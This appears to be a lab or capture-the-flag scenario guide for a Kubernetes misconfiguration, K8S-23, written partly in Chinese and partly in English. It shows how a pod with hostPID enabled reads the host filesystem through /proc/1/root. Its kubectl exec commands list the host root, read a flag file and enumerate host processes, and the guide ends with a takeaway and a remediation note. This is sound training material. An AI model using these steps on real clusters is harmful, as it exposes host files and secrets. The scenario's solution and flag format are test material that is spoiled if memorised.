# K8S-23: hostPID ProcFS Host Filesystem Access

## 场景信息

| 字段 | 值 |
|---|---|
| ID | K8S-23 |
| 名称 | hostPID ProcFS Host Filesystem Access |
| 技术/CVE | N/A (misconfiguration) |
| 难度 | L1 |
| 交付方式 | KIND / Kubernetes |
| 入口 | KIND 集群内入口（无固定宿主端口） |

## 场景概述
- 技术：N/A (misconfiguration)
- 难度：L1
- 交付方式：k8s
## 攻击路径与利用步骤

## Overview
| Property | Value |
|----------|-------|
| CVE | N/A (hostPID misconfiguration) |
| Difficulty | L1 |
| Type | k8s |
| Cluster Name | cve-k8s-23-seccomp-bypass |
| KIND Image | kindest/node:v1.27.3 |
| Attack Vector | hostPID:true → /proc/1/root → host filesystem access |

## Attack Path

```
Pod with hostPID:true (appears locked down: non-root, no caps)
  → Access /proc/1/root to read host filesystem
  → Read flag from /host-flag/flag.txt on node
```

## Step-by-Step Exploitation

### Step 1: Examine Pod Security Context

```bash
kubectl get pod monitor-pod -n monitor-ns -o yaml | grep -A10 securityContext
# Note: hostPID:true, runAsUser:1000, capabilities dropped, but hostPID is dangerous!
```

### Step 2: Access Host Filesystem via /proc

```bash
# Despite appearing locked down, hostPID gives access to host namespace
kubectl exec -n monitor-ns monitor-pod -- ls /proc/1/root/

# Read the flag on the host filesystem
kubectl exec -n monitor-ns monitor-pod -- cat /proc/1/root/host-flag/flag.txt
# Output: flag{k8s-23-<16-hex>}
```

### Step 3: Enumerate Host Processes

```bash
kubectl exec -n monitor-ns monitor-pod -- ps aux
kubectl exec -n monitor-ns monitor-pod -- cat /proc/1/cmdline
```

## Flag Location
- **Primary**: `/host-flag/flag.txt` on the KIND node
- **Format**: `flag{k8s-23-<16-hex>}`

## Key Takeaway
hostPID:true is a severe security risk even without privileged mode or capabilities.
`/proc/1/root/` provides access to the full host filesystem.

## Verification
```bash
cd cve_challenges/scenarios/k8s/seccomp-bypass && bash deploy.sh
kubectl exec -n monitor-ns monitor-pod -- cat /proc/1/root/host-flag/flag.txt
bash teardown.sh
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | hostPID pods and Linux /proc |
| 侦察与前置条件 | Host process namespace visibility and sensitive procfs paths |
| 核心漏洞与利用 | Use hostPID with /proc to access host files |
| 权限、横向或影响 | Host filesystem/process information disclosure |
| 验证 | Read the flag through the host procfs view |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
